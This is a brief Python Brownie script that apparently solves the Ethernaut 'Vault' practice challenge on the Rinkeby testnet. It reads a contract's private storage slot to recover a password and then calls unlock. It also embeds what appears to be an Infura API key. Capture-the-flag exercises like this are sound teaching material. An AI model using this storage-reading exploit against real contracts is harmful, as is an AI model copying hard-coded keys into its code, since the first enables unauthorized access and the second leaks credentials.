from web3 import Web3
from scripts.helpful_scripts import get_account
from brownie import interface


def main():
    account = get_account()
    vault = interface.Vault("0x5b39e6e0aBA67E76015A90a2B7Dd4859fE8bc443")

    # web3 object for connecting to the blockchain
    w3 = Web3(
        Web3.HTTPProvider(
            "https://rinkeby.infura.io/v3/80514b47890f4b358946727268128c71"
        )
    )
    password = w3.eth.get_storage_at(vault.address, 1)

    vault.unlock(password, {"from": account})
